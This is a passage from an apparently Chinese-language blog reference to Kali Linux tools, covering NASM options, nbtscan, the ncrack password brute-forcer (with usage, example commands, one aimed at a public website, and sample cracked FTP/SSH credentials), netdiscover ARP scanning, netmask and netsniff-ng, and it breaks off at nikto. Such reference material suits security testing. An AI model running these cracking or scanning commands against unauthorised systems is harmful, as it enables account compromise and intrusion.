选项：启用调试信息。<br><br>这个选项可以用来以指定的格式生成调试信息。 使用不带-F的-g导致以默认格式发送调试信息，如果有的话，为所选输出格式。 如果当前没有以选定的输出格式执行调试信息，-g是静默的忽略。<br><br> <br><br>-X 选项：选择错误报告格式<br><br>这个选项可以用来为可能的错误信息选择错误报告格式由NASM制作。目前，可以选择两种错误报告格式。他们是-Xvc选项和-Xgnu选项。 GNU格式是默认的，如下所示：<br><br>filename.asm：65：错误：特定的错误消息<br><br>其中filename.asm是检测到错误的源文件的名称，65是源文件<br><br>检测到错误的文件行号，错误是错误的严重程度（可能是警告），具体的错误信息是一个更详细的文字信息，这应该有所帮助精确确定问题。<br><br>另一种由-Xvc指定的格式是Microsoft Visual C ++和其他一些程序使用的样式。它看起来像这样：filename.asm（65）：错误：特定的错误消息<br><br>唯一的区别是行号在括号内，而不是由冒号分隔。<br><br> <br><br>-Z 选项：将错误发送到文件<br><br>在MS-DOS下，它可能很难（虽然有办法）重定向的标准错误输出程序到一个文件。 由于NASM通常在stderr上产生警告和错误信息，这可以如果（例如）要将它们加载到编辑器中，则很难捕获错误。因此，NASM提供了-Z选项，并带有导致错误发送到的文件名参数指定的文件而不是标准错误。 因此，您可以通过键入将错误重定向到文件中<br><br>nasm -Z myfile.err -f obj myfile.asm<br>在NASM的早期版本中，这个选项被称为-E，但是它被改变了，因为-E是一个选项通常只用于预处理，结果是灾难性的。<br><br> <br><br>-s 选项：将错误发送到标准输出<br><br>-s选项将错误消息重定向到标准输出而不是标准错误，因此可以在下面重定向MS-DOS。 要组装文件myfile.asm并将其输出传递给更多程序，可以键入：<br><br>nasm -s -f obj myfile.asm | more<br> <br><br>-i 选项：包含文件搜索目录<br><br>当NASM在源文件中看到％include或％pathsearch指令时，它将不仅在当前目录中搜索给定的文件，而且还将搜索任何文件通过使用-i选项在命令行中指定的目录。所以你可以包含文件从一个宏库，例如，通过键入<br><br>nasm -ic：\ macrolib \ -f obj myfile.asm<br>（像往常一样，-i和路径名之间的空格是允许的，并且是可选的）。<br><br>为了完整的源代码可移植性，NASM不理解文件命名正在运行的操作系统的约定;您提供的字符串作为参数的-i选项将是与写入包含文件的名称完全相同。因此在后面的反斜杠上面的例子是必要的。在Unix下，同样需要一个尾随的正斜杠。（你可以使用这个优点，如果你真的反常，注意选项-ifoo会导致％include“bar.i”搜索文件foobar.i ...）如果你想定义一个标准的包含搜索路径，类似于Unix系统上的/ usr / include，那么你应在NASMENV环境变量中放置一个或多个-i指令。对于许多C编译器的Makefile兼容性，此选项也可以指定为-I。<br><br> <br><br>-p 选项：预先包含文件<br><br>NASM允许您使用-p选项指定要预先包含在源文件中的文件。 所以赛跑<br><br>nasm myfile.asm -p myinc.inc<br>相当于运行nasm myfile.asm并将指令％include“myinc.inc”放在文件的开始。为了与-I，-D和-U选项保持一致，这个选项也可以被指定为-P。<br><br> <br><br>-d 选项：预定义一个宏<br><br>正如-p选项提供了在源文件开始处放置％include指令的替代方法，-d选项给出了放置％define指令的替代方案。 你可以编码<br><br>nasm myfile.asm -dFOO = 100<br>作为放置指令的替代方法<br><br>％定义FOO 100<br><br>在文件的开始。 您也可以错过宏观价值：选项-dFOO相当于编码％定义FOO。 这种形式的指令对于选择组装时间选项可能是有用的然后使用％ifdef进行测试，例如-dDEBUG。对于许多C编译器的Makefile兼容性，此选项也可以指定为-D。<br><br> <br><br>-u 选项：取消定义宏<br><br>-u选项取消定义一个宏，否则它将被自动或者预定义通过前面在命令行中指定的-p或-d选项。<br><br>例如，下面的命令行：<br><br>nasm myfile.asm -dFOO = 100 -uFOO<br>会导致FOO不是程序中的预定义宏。 这对覆盖选项很有用在Makefile的不同位置指定。对于许多C编译器的Makefile兼容性，此选项也可以指定为-U。<br><br> <br><br>-E 选项：仅预处理<br><br>NASM允许预处理器自己运行，直到一点。 使用-E选项（需要没有参数）将导致NASM预处理其输入文件，展开所有的宏引用，全部删除注释和预处理器指令，并将结果文件打印到标准输出（或保存到一个文件，如果-o选项也被使用）。<br><br>该选项不能应用于需要预处理器评估表达式的程序这取决于符号的值：所以代码如％assign tablesize（$ --tablestart）会在预处理模式下导致错误。<br><br>为了兼容老版本的NASM，这个选项也可以写成-e。 -E在旧版本的NASM相当于现在的-Z选项。<br><br> <br><br>-a 选项：根本不要预处理<br><br>如果将NASM用作编译器的后端，则可能需要抑制预处理完全假设编译器已经完成了它，以节省时间和增加编译速度。 -a选项，不需要参数，指示NASM替换其强大的预处理器与不做任何事情的存根预处理器。<br><br> <br><br>-O 选项：指定多通道优化<br><br>使用-O选项，您可以告诉NASM执行不同级别的优化。语法是：<br><br>-O0：没有优化。如果没有指定一个简短格式，所有操作数都采用长格式有条件的跳转。这是为了匹配NASM 0.98的行为。<br><br>-O1：最小化优化。如上所述，但是符合有符号字节的立即操作数是优化，除非长表格被指定。条件跳转默认为长格式，除非否则指定。<br><br>-Ox（其中x是实际字母x）：Multipass优化。最小化分支偏移并签名即时字节，除非已经使用strict关键字，否则覆盖大小规范）。为了与早期版本兼容，字母x也可以是更大的数字比一个。这个数字对实际的传球次数没有影响。-Ox模式被推荐用于大多数用途，并且是自NASM 2.09以来的默认模式。<br><br>请注意，这是一个大写字母O，与用于指定输出文件的小o不同名称。<br><br> <br><br>-t 选项：启用TASM兼容模式<br><br>NASM包含与Borland的TASM兼容的有限形式。 当使用NASM的-t选项时，做出以下更改：<br><br>本地标签可以用@@替代前缀。<br><br>括号内支持大小覆盖。 在TASM兼容模式下，广场内的尺寸覆盖括号会更改操作数的大小，而不是操作数的地址类型NASM语法。 例如。 mov eax，[DWORD val]在TASM兼容模式下是有效的语法。 注意您将无法覆盖该指令的默认地址类型。<br><br>支持某些指令的前缀形式（arg，<span class="hljs-keyword">elif</span>，<span class="hljs-keyword">else</span>，endif，<span class="hljs-keyword">if</span>，ifdef，ifdifi，ifndef，include，<span class="hljs-built_in">local</span>）<br><br> <br><br>-v 选项：显示版本信息<br><br>键入NASM -v将显示您正在使用的NASM的版本以及它所在的日期编译。如果您报告错误，您将需要版本号。对于与Yasm的命令行兼容性，格式--v也可以用于此选项NASM版本.<br><br> <br><br>-y 选项：显示可用的调试信息格式<br><br>键入nasm -f &lt;选项&gt; -y 将显示给定的可用调试信息格式的列表输出格式。 默认格式用星号表示。 例如：<br><br>nasm -f elf -y<br> <br><br>--prefix和--postfix选项。<br><br>--prefix和--postfix选项将给定的参数前置或附加到全部全局或外部变量。 例如。 --prefix _将在全局和全部前面加上下划线外部变量，因为C需要在一些系统调用约定中，但不是全部。<br></code></pre></td></tr></table></figure><p>示例:</p><p>1、将myfile.asm组装成一个ELF对象文件myfile.o</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">nasm -f elf myfile.<span class="hljs-keyword">asm</span><br></code></pre></td></tr></table></figure><p> <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122245365.png" alt="image-20220412224532248"></p><p>2、将myfile.asm组装成一个原始的二进制文件myfile.com</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">nasm -f bin myfile.<span class="hljs-keyword">asm</span> -o myfile.com<br></code></pre></td></tr></table></figure><p> <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122245088.png" alt="image-20220412224549978"></p><p>3、要生成列表文件，在原始文件左侧显示从NASM输出的十六进制代码来源，使用-l选项给出一个列表文件名；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">nasm -f coff myfile.<span class="hljs-keyword">asm</span> -l myfile.lst<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122246825.png" alt="image-20220412224648674"></p><h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><h3 id="描述：-28"><a href="#描述：-28" class="headerlink" title="描述："></a>描述：</h3><p>Nbtscan是一款能够扫描Windows网络NetBIOS信息的网络工具，软件体积极小，功能却很丰富，稳定强。能够准确获取电脑的真实IP地址和mac地址。就是只能在局域网内使用。感兴趣的朋友们可以赶紧下载使用。<em><strong>*但只能用于局域网*</strong></em>,NBTSCAN可以取到PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP&#x2F;和MAC地址。NBTSCAN可以取到PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP&#x2F;和MAC地址。<em><strong>*总之，NBTSCAN可以取到PC的真实IP地址和MAC地址。*</strong></em></p><p><strong>软件功能</strong></p><p>　　1、获取电脑的真实IP地址和mac地址。</p><p>　　2、当局域网内有电脑感染病毒木马时，nbtscan能快速找到感染木马的电脑。</p><p>　　3、查看局域网内其他用户的信息。</p><p><strong>软件特点</strong></p><p>　　1、体积小巧，安装便捷。</p><p>　　2、界面清爽，操作简单。</p><p>　　3、功能全面。</p><h3 id="参数：-19"><a href="#参数：-19" class="headerlink" title="参数：."></a>参数：.</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122253705.png" alt="image-20220412225355588"></p><h2 id="ncrack"><a href="#ncrack" class="headerlink" title="ncrack"></a>ncrack</h2><h3 id="描述：-29"><a href="#描述：-29" class="headerlink" title="描述："></a>描述：</h3><p>Ncrack是一个高速的网络认证破解工具，它可以帮助企业测试所有的网络主机和网络设备的密码强度，提高企业网络的安全性。安全专业人员也可使用<br>Ncrack做渗透测试。Ncrack采用了模块化设计，类似Nmap的命令行语法和一个动态的引擎，该引擎是Ncrack可以依据不同的网络反馈自适应<br>操作。Ncrack可以可靠的进行大规模网络主机安全审计。Ncrack支持windows和linux系统</p><h3 id="参数：-20"><a href="#参数：-20" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs bash">用法：<br>ncrack [Options] &#123;target and service specification&#125;<br><br>ncrack [选项] &#123;目标和服务规格&#125;<br><br> <br><br>目标规格：<br><br>可以通过主机名，IP地址，网络等<br><br>例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254<br><br>-iX &lt;输入文件名&gt;：从Nmap的-oX XML输出格式输入<br><br>-iN &lt;输入文件名&gt;：从Nmap的-oN正常输出格式输入<br><br>-iL &lt;输入文件名&gt;：从主机/网络列表中输入<br><br>--exclude&lt;host1 [，host2] [，host3]，...&gt;：排除主机/网络<br><br>--excludefile &lt;exclude_file&gt;：从文件中排除列表<br><br> <br><br>服务规格：<br><br>可以通过&lt;service&gt;：// target（标准）表示法或者使用-p将以非标准符号应用于所有主机。<br><br>可以将服务参数指定为主机特定的，特定于服务的类型（-m）或全局（-g）。<br><br>例如：ssh：//10.0.0.10,at=10,cl=30 -m ssh：at = 50 -g <span class="hljs-built_in">cd</span> = 3000<br><br>例2：ncrack -p ssh，ftp：3500,25 10.0.0.10 scanme.nmap.org google.com:80,ssl<br><br>-p &lt;服务列表&gt;：服务将被应用于所有非标准的符号主机<br><br>-m &lt;服务&gt;：&lt;选项&gt;：选项将应用于此类型的所有服务<br><br>-g &lt;选项&gt;：选项将应用于全局的每个服务<br><br> <br><br>其他选项：<br><br>ssl：通过此服务启用SSL<br><br>path &lt;name&gt;：用于模块像HTTP（<span class="hljs-string">&#x27;=&#x27;</span>需要转义，如果使用）<br><br> <br><br>时间和性能：<br><br>采取&lt;time&gt;的选项是以秒为单位的，除非你附加<span class="hljs-string">&#x27;ms&#x27;</span>  （毫秒），“m”（分钟）或“h”（小时）的值（例如30m）。<br><br> <br><br>特定于服务的选项：<br><br>cl（最小连接限制）：最小并发并行连接数<br><br>CL（最大连接限制）：并行并行连接的最大数量<br><br>at（身份验证尝试）：每个连接的身份验证尝试<br><br><span class="hljs-built_in">cd</span>（连接延迟）：每个连接启动之间的延迟&lt;time&gt;<br><br>cr（连接重试）：服务连接尝试次数上限<br><br>to（超时）：服务的最大开发&lt;时间&gt;，不管迄今为止成功<br><br>-T &lt;0-5&gt;：设定时间模板（越快越快）<br><br>--connection-limit &lt;number&gt;：总并发连接的阈值<br><br> <br><br>认证：<br><br>-U &lt;文件名&gt;：用户名文件<br><br>-P &lt;文件名&gt;：密码文件<br><br>--user &lt;username_list&gt;：逗号分隔的用户名单<br><br>--pass &lt;password_list&gt;：逗号分隔的密码列表<br><br>--passwords-first：迭代每个用户名的密码列表。默认是相反的。<br><br>--pairwise：成对选择用户名和密码。<br><br> <br><br>OUTPUT：<br><br>-oN / -oX &lt;文件&gt;：分别以正常和XML格式输出扫描到给定的文件名。<br><br>-oA &lt;<span class="hljs-built_in">basename</span>&gt;：一次输出两种主要格式<br><br>-v：增加详细程度（使用两次或更多效果更好）<br><br>-d [级别]：设置或增加调试级别（最多10个有意义）<br><br>--nsock-trace &lt;level&gt;：设置nsock跟踪级别（有效范围：0 - 10）<br><br>--log-errors：将错误/警告记录到正常格式的输出文件<br><br>--append-output：附加到指定的输出文件而不是clobber<br><br> <br><br>MISC：<br><br>--resume &lt;file&gt;：继续先前保存的会话<br><br>--save&lt;file&gt;：保存具有特定文件名的恢复文件<br><br>-f：在找到一个证书后退出服务<br><br>-6：启用IPv6破解<br><br>-sL或--list：只列出主机和服务<br><br>--datadir &lt;<span class="hljs-built_in">dirname</span>&gt;：指定自定义Ncrack数据文件位置<br><br>--proxy &lt;<span class="hljs-built_in">type</span>：// proxy：port&gt;：通过socks4，4a，http进行连接。<br><br>-V：打印版本号<br><br>-h：打印此帮助摘要页面。<br><br> <br><br>模块：<br><br>FTP，SSH，Telnet，HTTP（S），POP3（S），SMB，RDP，VNC，SIP，Redis，PostgreSQL，MySQL<br></code></pre></td></tr></table></figure><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子:"></a>例子:</h3><ol><li><p>ncrack -v –<em>user</em> root localhost：22 </p></li><li><p>ncrack -v -T5 <a href="https://192.168.0.1/">https://192.168.0.1</a> </p></li><li><p>ncrack -v -iX〜&#x2F; nmap.<em>xml</em> -g CL &#x3D; 5，to &#x3D; 1h </p></li><li><p>ncrack -v <a href="https://www.fujieace.com/">https://www.fujieace.com</a></p></li></ol><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122257942.png" alt="image-20220412225753808"></p><p><strong>一个有代表性的Ncrack扫描</strong></p><ol><li>ncrack 10.0.0.130:21 192.168.1.2:22</li></ol><blockquote><p>在2016-01-03 22:10开始Ncrack 0.6（<a href="http://ncrack.org)eest/">http://ncrack.org）EEST</a></p><p>发现10.0.0.130上的ftp证书21 &#x2F; tcp：</p><p>10.0.0.130 21 &#x2F; tcp ftp：admin hello1</p><p>在192.168.1.2 22 &#x2F; tcp上发现了ssh的证书：</p><p>192.168.1.2 22 &#x2F; tcp ssh：guest 12345</p><p>192.168.1.2 22 &#x2F; tcp ssh：admin money $</p><p>Ncrack完成：在156.03秒扫描了2个服务。</p><p>Ncrack完成了。</p></blockquote><h3 id="ncrack效果与评价："><a href="#ncrack效果与评价：" class="headerlink" title="ncrack效果与评价："></a>ncrack效果与评价：</h3><p>此软件可以说是非常的不错，从上面最后一个示例就可以看出来。此软件并不是万能的，只要你的网站做了一定的安全措施，此工具对你扫描是没有什么太大的效果。</p><p>更多内容：<a href="https://nmap.org/ncrack/man.html">https://nmap.org/ncrack/man.html</a></p><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><h3 id="描述：-30"><a href="#描述：-30" class="headerlink" title="描述："></a>描述：</h3><p>netdiscover是一种主动&#x2F;被动ARP侦察工具,最初开发用于在战争场景中获取有关没有DHCP服务器的无线网络的信息.它也可以用于交换网络.建立在libnet(用C语言编写的小型接口函数库,提供了底层网络数据包的构造,处理和发送功能)和libpcap(UNIX&#x2F;LINUX下的网络数据包捕获函数包,也是一个小型的接口函数库,用于捕获网络数据包)之上，它可以被动地检测在线主机或通过发送ARP请求来搜索它们.</p><p>此外,它还可用于检查网络的ARP流量,或使用自动扫描模式查找网络地址,这将扫描常见的本地网络.</p><h3 id="参数：-21"><a href="#参数：-21" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">-i device(网卡设备)<br>嗅探和注入数据包的网络接口.如果未指定接口,则将使用第一个可用的网卡接口(可用ifconfig命令查看).<br><br>-r range(IP地址范围)<br>扫描给定范围而不是自动扫描.有效范围值区域例如:192.168.0.0/24,192.168.0.0/16或 192.168.0.0/8.目前,可接受的范围只有/8,/16和/24.(/8,/16,/24代表掩码)<br><br>-l file(给定文件列表)<br>扫描包含在给定文件中的范围,每行必须只包含一个范围.<br><br>-p(passive:被动模式)<br>启用被动模式.在被动模式下,netdiscover不会发送任何内容,而只会嗅探.<br><br>-m file(给定文件列表)<br>扫描已知MAC和主机名的列表.<br><br>-F filter(过滤器)<br>自定义pcap过滤器表达式(默认值:<span class="hljs-string">&quot;arp&quot;</span>,过滤器表达式可以自己定义).<br><br>-s time(时间)<br>每次ARP请求注入之间的睡眠给定时间(指定等待时间,以毫秒为单位).(默认1)<br><br>-n node(节点)<br>用于扫描的源IP的最后一个IP八位字节(八位二进制).如果已使用默认主机(x.x.x.67),您可以更改它.(允许范围是2到253,默认67)<br><br>-c count(计数,发包数量)<br>发送每个ARP请求的次数.对于有数据包丢失的网络很有用,因此它将扫描每个主机的给定时间.(默认1)<br><br>-d<br>忽略主目录中的配置文件(仅适用于自动扫描和快速模式).这将使用默认范围和IP进行自动扫描和快速模式.有关配置文件的信息,请参见下文.<br><br>-f<br>启用快速模式扫描.这只会扫描每个网络上的 .1、.100 和 .254,此模式在搜索正在使用的范围时很有用,找到此类范围后,您可以进行特定范围扫描以查找在线主机.<br><br>-P<br>生成适合重定向到文件或由另一个程序解析的输出,而不是使用交互模式.启用此选项,netdiscover将在扫描给定范围后停止(输出一个能让另一个程序解析的格式).<br><br>-L<br>与-P类似,但在主动扫描后继续执行程序以被动捕获ARP数据包.<br><br>-N<br>不打印标题.仅在启用-P或-L时有效.<br></code></pre></td></tr></table></figure><p>示例:</p><p>用eth0快速扫描常用局域网地址(只搜索和自己主机在同一局域网的网关):<br>netdiscover -i eth0 -f</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122306186.png" alt="image-20220412230602060"></p><p>扫描某些固定范围:<br>netdiscover -i etho0 -r 172.26.0.0&#x2F;24<br>netdiscover -r 192.168.0.0&#x2F;16<br>netdiscover -r 192.168.0.0&#x2F;8</p><p>扫描常见LAN地址的睡眠(间隔)时间为0.5秒(默认值为1秒):<br>netdiscover -s 0.5</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122307611.png" alt="image-20220412230736494"></p><p>在快速模式下扫描固定范围,睡眠(间隔)时间为0.5秒(默认值为1秒):<br>netdiscover -r 192.168.0.0&#x2F;16 -f -s 0.5</p><p>只嗅探ARP流量,不发送任何内容:<br>netdiscover -p</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122309828.png" alt="image-20220412230915707"></p><h2 id="NetHunter"><a href="#NetHunter" class="headerlink" title="NetHunter"></a>NetHunter</h2><h3 id="描述：-31"><a href="#描述：-31" class="headerlink" title="描述："></a>描述：</h3><h3 id="收集kali信息收集ip工具"><a href="#收集kali信息收集ip工具" class="headerlink" title="收集kali信息收集ip工具"></a>收集kali信息收集ip工具</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122311230.png" alt="image-20220412231130060"></p><h2 id="netmask"><a href="#netmask" class="headerlink" title="netmask"></a>netmask</h2><h3 id="描述：-32"><a href="#描述：-32" class="headerlink" title="描述："></a>描述：</h3><p>netmaks可以在 IP范围、<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81&spm=1001.2101.3001.7020">子网掩码</a>、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换！</p><h3 id="参数：-22"><a href="#参数：-22" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"> netmaks -h<br> This is netmask, an address netmask generation utility<br>Usage: netmask spec [spec ...]<br>  -h, --<span class="hljs-built_in">help</span>                    Print a summary of the options<br>  -v, --version                 Print the version number<br>  -d, --debug                   Print status/progress information<br>  -s, --standard                Output address/netmask pairs（转换到标准的 ip地址/子网掩码）<br>  -c, --cidr                    Output CIDR format address lists（转换到CIDR格式）<br>  -i, --cisco                   Output Cisco style address lists（转换到Cisco反向子网掩码）<br>  -r, --range                   Output ip address ranges（转换到IP地址范围）<br>  -x, --hex                     Output address/netmask pairs <span class="hljs-keyword">in</span> hex（转换到16进制）<br>  -o, --octal                   Output address/netmask pairs <span class="hljs-keyword">in</span> octal（转换到10进制）<br>  -b, --binary                  Output address/netmask pairs <span class="hljs-keyword">in</span> binary（转换到2进制）<br>  -n, --nodns                   Disable DNS lookups <span class="hljs-keyword">for</span> addresses<br>  -f, --files                   Treat arguments as input files<br>Definitions:<br>  a spec can be any of:<br>    address              单独IP<br>    address:address      开始IP:结束IP<br>    address:+address     开始IP:+IP个数<br>    address/mask         IP/掩码<br>  an address can be any of:<br>    N           decimal number<br>    0N          octal number<br>    0xN         hex number<br>    N.N.N.N     dotted quad<br>    hostname    dns domain name<br>  a mask is the number of bits <span class="hljs-built_in">set</span> to one from the left<br></code></pre></td></tr></table></figure><p>使用情况如下：</p><p>ip范围转换到cidr格式</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122317547.png" alt="image-20220412231731070"></p><p>ip范围转换到标准的子网掩码格式</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122318348.png" alt="image-20220412231812237"></p><p>ip范围转换到cisco格式</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122318043.png" alt="image-20220412231848902"></p><p>cidr个数转换到ip范围格式</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122319389.png" alt="image-20220412231942244"></p><p>把点分10<a href="https://so.csdn.net/so/search?q=%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">进制</a>的ip转换到二进制</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122320089.png" alt="image-20220412232004940"></p><h2 id="netsniff-ng"><a href="#netsniff-ng" class="headerlink" title="netsniff-ng"></a>netsniff-ng</h2><h3 id="描述：-33"><a href="#描述：-33" class="headerlink" title="描述："></a>描述：</h3><p>netsniff-ng 是一个高性能的Linux下基于命令行的网络包分析工具，与 tcpdump 和其他基于 libpcap 的包分析器不同的是，netsniff-ng 直接将输入的帧循环映射到接收缓冲区中，这样就可以直接在用户空间中进行方法，而无须在地址空间中复制。可用来调试本地网、测量性能和吞吐量，并生成相应的数据统计报表</p><h3 id="参数：-23"><a href="#参数：-23" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122332494.png" alt="image-20220412233221328"></p><p>示例:</p><p> IPv4 trace of AS with TCP SYN probe (this will most-likely pass):</p><p>astraceroute -i eth0 -N -S -H netsniff-ng.org</p><p>IPv4 trace of AS with TCP ECN SYN probe:    </p><p>astraceroute -i eth0 -N -E -H netsniff-ng.org  </p><p>IPv4 trace of AS with TCP FIN probe:    </p><p>astraceroute -i eth0 -N -F -H netsniff-ng.org  </p><p>IPv4 trace of AS with Xmas probe:    </p><p>astraceroute -i eth0 -N -FPU -H netsniff-ng.org </p><p> IPv4 trace of AS with Null probe with ASCII payload:    </p><p>astraceroute -i eth0 -N -H netsniff-ng.org -X “censor-me” -Z  </p><p>IPv6 trace of AS up to <a href="http://www.6bone.net/">www.6bone.net</a>:    </p><p>astraceroute -6 -i eth0 -S -E -N -H <a href="http://www.6bone.net/">www.6bone.net</a></p><h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><h3 id="描述：-34"><a href="#描述：-34" class="headerlink" title="描述："></a>描述：</h3><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件&#x2F;CGIs；超过625种服务器版本；超过230种特定服务器问题。扫描项和插件可以自动更新（如果需要）。基于Whisker&#x2F;libwhisker完成其底层功能。</p><p>站点<br><a href="https://cirt.net/Nikto2">https://cirt.net/Nikto2</a> </p><p>github源码<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p><p>使用手册<br><a href="https://cirt.net/nikto2-docs">https://cirt.net/nikto2-docs</a></p><h3 id="参数：-24"><a href="#参数：-24" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 